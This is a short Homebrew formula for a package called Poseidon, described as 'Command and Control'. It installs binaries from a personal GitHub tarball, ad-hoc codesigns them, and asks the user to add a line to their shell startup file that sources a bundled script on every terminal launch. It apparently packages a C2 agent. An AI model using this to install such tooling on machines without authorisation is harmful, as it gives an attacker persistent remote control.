class Poseidon < Formula
    desc "Command and Control"
    homepage "https://github.com/kvcallfield/"
    url "https://github.com/kvcallfield/homebrew-brew/blob/main/poseidon-1.33.7.tar.gz"
    sha256 "a25893127162e1136adaf4b6ccc0aead47d0bdb29e79ba91ce481b0e16d08e36"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
